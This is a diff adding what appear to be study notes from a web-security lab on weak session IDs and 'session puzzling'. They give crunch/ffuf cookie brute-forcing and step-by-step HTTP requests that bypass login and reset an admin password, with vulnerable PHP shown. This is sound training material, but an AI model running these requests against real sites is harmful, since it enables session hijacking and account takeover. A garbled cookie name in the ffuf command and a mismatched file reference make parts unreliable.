@@ -1,0 +1,422 @@
+> Session puzzling vulnerabilities can only occur in web applications that stores data in session variables, like PHP
+
+# Weak Session IDs
+
+When login in, the webapp send a cookie with very short length
+
+```http
+HTTP/1.1 302 Found
+Set-Cookie: sessionID=a1np
+Location: /profile.php
+```
+
+We can brute force the cookie. Assuming the cookie is 4 characters long containing lowercase characters and digit, we can generate a wordlist with `crunch`
+
+```sh
+crunch 4 4 'abcdefghijklmnopqrstuvwxyz1234567890' -o wordlist.txt
+```
+
+Then brute force with `ffuf`. Remember to filter size `-fs` or code `-fc`
+
+```sh
+ffuf -u 'http://10.10.10.10/profile.php' -H 'Cookie: sa1npessionID=FUZZ' -w ./wordlist.txt -c -ic -t 250
+```
+
+# Insufficient randomness
+
+First, we send the login request to burp sequencer
+
+![](/images/80a1bd2615ca4bd75f83abbcffd4255e.png)
+
+Go to sequencer, and make sure burp detects the cookie, then click on `Start live capture`. After about 1000 requests or so, you can see all the analysis
+
+![](/images/cee99376fe4272e6fd93b1ba51a8cf97.png)
+
+After seeing the analysis, do something with it idk man
+# Common session variable
+
+This is more of a logic bug, meaning, you have to be smart and just wing it.
+
+## Discovery
+
+Imagine there is a page to create new user. We go in and create a new user
+
+```http
+POST /register_1.php HTTP/1.1
+Cookie: PHPSESSID=0ob726qlcclk3afqf2rlv6mmj0
+
+Username=admin&Description=admin&Password=admin&Question=admin&Answer=admin&Submit=Login
+```
+
+After that, the webapp redirects us to `/register_2`, which displays a page to verify our registration information
+
+```http
+HTTP/1.1 302 Found
+Location: register_2.php
+```
+
+Finally, we click on submit, which will either return "account exists" or register our account
+
+```http
+POST /register_3.php HTTP/1.1
+Cookie: PHPSESSID=0ob726qlcclk3afqf2rlv6mmj0
+
+Submit=register
+```
+
+When analyzing the network traffic generated during a account registration flow, we can see that there are multiple steps:
+
+- In the first step, we provide the user name, password, etc.
+- In the second step, the webapp displays our registration info on a page for us to verify
+- In the third step, we either create the account or it errors saying "account exists"
+
+When we confirm registering account, we did not send any information, so the webapp must have stored our info in session cookie.
+
+## Exploitation
+
+To exploit this, we send this request to `register_1.php`, which will create a `username` session variable in our cookie with the value `admin`
+
+```http
+POST /register_1.php HTTP/1.1
+Cookie: PHPSESSID=0ob726qlcclk3afqf2rlv6mmj0
+
+Username=admin&Description=admin&Password=admin&Question=admin&Answer=admin&Submit=Login
+```
+
+Finally, we just use that cookie to access a post-login page.
+
+
+```http
+GET /profile.php HTTP/1.1
+Cookie: PHPSESSID=0ob726qlcclk3afqf2rlv6mmj0
+```
+
+## Explanation
+
+In simplified code, the vulnerability manifests as follows. The first phase of the password reset process in `reset_1.php` sets the session variable `Username` to the username provided by the user:
+
+```php
+<SNIP>
+
+if(isset($_POST['Submit'])){
+	$_SESSION['Username'] = $_POST['Username'];
+	header("Location: reset_2.php");
+	exit;
+}
+
+<SNIP>
+```
+
+The authentication process utilizes the same session variable, and authentication in `profile.php` only checks if this session variable is set:
+
+```php
+<SNIP>
+
+if(!isset($_SESSION['Username'])){
+    header("Location: login.php");
+	exit;
+  }
+
+<SNIP>
+```
+
+# Premature Session Population
+
+This is more of a logic bug, meaning, you have to be smart and just wing it.
+
+## Discovery
+
+We log into the webapp normally
+
+```http
+POST /login.php HTTP/1.1
+Cookie: PHPSESSID=acc9f3vi1vq9h66s6juvusf346
+
+Username=htb-stdnt&Password=Academy_student%21&Submit=Login
+```
+
+After entering the correct credentials, we were redirected to `/login.php?success=1`
+
+```http
+HTTP/1.1 302 Found
+Location: /login.php?success=1
+```
+
+Which, again, redirect us to a post-login page `/profile.php`
+
+```http
+HTTP/1.1 302 Found
+Location: /profile.php
+```
+
+However, when we enter a wrong credentials:
+
+```http
+POST /login.php HTTP/1.1
+Cookie: PHPSESSID=acc9f3vi1vq9h66s6juvusf346
+
+Username=admin&Password=admin&Submit=Login
+```
+
+We are redirected to `/login?failed=1`
+
+```http
+HTTP/1.1 302 Found
+Location: /login.php?failed=1
+```
+
+Which display a message saying the credentials are wrong
+
+```http
+HTTP/1.1 200 Found
+
+...
+<p>Login information is wrong for user admin</p>
+...
+```
+
+HTTP is stateless protocol, each request does not have context. So when we access `/login.php?failed=1`, we did not send any context, but the webapp knows we tried logging in with `admin` credentials.
+
+From that, we can deduct that the webapp stores the information in our cookie. We can confirm that by sending a request to `/login.php?failed=1` without a cookie:
+
+```http
+GET /login.php?failed=1 HTTP/1.1
+```
+
+And the webapp does not display the username
+
+```http
+HTTP/1.1 200 Found
+
+...
+<p>Login information is wrong for user </p>
+...
+```
+
+And when we send the same request with our previous cookie
+
+```http
+GET /login.php?failed=1 HTTP/1.1
+Cookie: PHPSESSID=acc9f3vi1vq9h66s6juvusf346
+```
+
+We get the same response, the webapp did not display the username. This means that when we access `/login.php?failed=1`, the session variable in our cookie is destroyed
+
+```http
+HTTP/1.1 200 Found
+
+...
+<p>Login information is wrong for user </p>
+...
+```
+
+## Exploitation
+
+First we login with a wrong credential, with or without cookie
+
+```http
+POST /login.php HTTP/1.1
+
+Username=admin&Password=admin&Submit=Login
+```
+
+The webapp redirects us to `/login?failed=1`, and also set a session cookie. We **do not follow redirect**, since that would destroy our session.
+
+```http
+HTTP/1.1 302 Found
+Location: /login.php?failed=1
+Set-Cookie: PHPSESSID=7me9ss2mvte17if0rj07epm0d0
+```
+
+We know that this session cookie contains  at least `username` session variable, so we send it to `/login.php?success=1` instead
+
+```http
+GET /login.php?success=1 HTTP/1.1
+Cookie: PHPSESSID=7me9ss2mvte17if0rj07epm0d0
+```
+
+We then get redirected to a post-login page like a normal successful login, successful exploitation
+
+```http
+HTTP/1.1 302 Found
+Location: /profile.php
+```
+
+## Explanation
+
+In simplified code, the vulnerability results like this. The login process sets the session variables that determine whether a user is authenticated or not before the result of the authentication is known, which is before the user's password is checked. The variables are only unset if the redirect to `/login.php?failed=1` is sent:
+
+```php
+<SNIP>
+
+if(isset($_POST['Submit'])){
+	$_SESSION['Username'] = $_POST['Username'];
+	$_SESSION['Active'] = true;
+
+	// check user credentials
+	if(login($Username, $_POST['Password'])) {
+	    header("Location: profile.php");
+	    exit;
+
+	} else {
+	    header("Location: login.php?failed=1");
+        exit;
+    }
+}
+if (isset($_GET['failed'])) {
+	session_destroy();
+    session_start();
+}
+
+<SNIP>
+```
+
+# Common Session Variables 2
+
+Same rodeo. The webapp has 2 function: password reset and user registration.
+
+Both of them has 3 phases. However, we can't bypass login like previous ones
+
+## Discovery
+
+We try resetting `admin`'s password
+
+```http
+POST /reset_1.php HTTP/1.1
+Cookie: PHPSESSID=f110vecqsa25lq81656grqpjdl
+
+Username=admin&Submit=Login
+```
+
+Webapp redirects us to phase 2 of password reset, which require us to answer security question to enter. However, we don't have the answer
+
+```http
+HTTP/1.1 302 Found
+Location: reset_2.php
+```
+
+We try skipping straight to step 3
+
+```http
+GET /reset_3.php HTTP/1.1
+Cookie: PHPSESSID=f110vecqsa25lq81656grqpjdl
+```
+
+But it doesn't work, indicating that there are some way to track phases, and of course it is stored in our session.
+
+```http
+HTTP/1.1 302 Found
+Location: login.php?msg=Please complete Phase 2 first
+```
+
+## Exploitation
+
+Now we go through the user registration process, enter `admin` for username
+
+```http
+POST /register_1.php HTTP/1.1
+Cookie: PHPSESSID=f110vecqsa25lq81656grqpjdl
+
+Username=admin&Description=admin&Password=admin&Question=admin&Answer=admin&Submit=Login
+```
+
+We got to phase 2, and complete phase 2
+
+```http
+HTTP/1.1 302 Found
+Location: register_2.php
+```
+
+```http
+POST /register_2.php HTTP/1.1
+Cookie: PHPSESSID=f110vecqsa25lq81656grqpjdl
+
+Phone=admin&Address=admin&Submit=Login
+```
+
+We got redirect to phase 3. Now our session cookie should have the session variable `phase=3`
+
+```http
+HTTP/1.1 302 Found
+Location: register_3.php
+```
+
+Now we go back to password reset function, straight to phase 3. Our session now has the required variables `username=admin` and `phase=3`
+
+```http
+GET /reset_3.php HTTP/1.1
+Cookie: PHPSESSID=f110vecqsa25lq81656grqpjdl
+```
+
+Webapp gave us an OK. We successfully bypassed security question
+
+```http
+HTTP/1.1 200 OK
+```
+
+Then we reset admin user's password. Account takeover
+
+```http
+POST /reset_3.php HTTP/1.1
+Cookie: PHPSESSID=f110vecqsa25lq81656grqpjdl
+
+Password=password&Submit=Login
+```
+
+## Explanation
+
+This session puzzling vulnerability is the result of reusing the same session variable to store the phase of two different processes. If these processes are executed concurrently, it is possible to bypass the security question in the password reset process, thereby leading to account takeover.
+
+Let's examine a simplified code snippet again to illustrate how the vulnerability occurs. The registration process uses the session variable `Phase` to track the user's current phase in the registration process, preventing them from skipping ahead without completing previous phases. Here is a simplified code snippet from `register_1.php`:
+
+```php
+<SNIP>
+
+if(isset($_POST['Submit'])){
+    $_SESSION['reg_username'] = $_POST['Username'];  
+    $_SESSION['reg_desc'] = $_POST['Description'];  
+    $_SESSION['reg_pw'] = $_POST['Password'];  
+    $_SESSION['reg_question'] = $_POST['Question'];  
+    $_SESSION['reg_answer'] = $_POST['Answer'];  
+
+    $_SESSION['Phase'] = 2;
+    header("Location: register_2.php");
+    exit;
+}
+
+<SNIP>
+```
+
+The phase is then checked in the following step, `register_2.php`:
+
+```php
+<SNIP>
+
+if($_SESSION['Phase'] !== 2){
+    header("Location: login.php?msg=Please complete Phase 1 first");
+	exit;
+};
+
+<SNIP>
+```
+
+The vulnerability occurs because the password reset process uses the same session variable `Phase` to keep track of the phase. Thus, it is possible to do the two processes concurrently and skip the security question to reset the admin user's password. Here is a simplified code snippet from `reset_1.php`:
+
+```php
+<SNIP>
+
+if(isset($_POST['Submit'])){
+	$user_data = fetch_user_data($_POST['Username']);
+
+    if ($user_data) {
+		$_SESSION['reset_username'] = $user_data['username'];
+        $_SESSION['Phase'] = 2;
+        header("Location: reset_2.php");
+        exit;
+	}
+	
+	<SNIP>
+}
+
+<SNIP>
+```
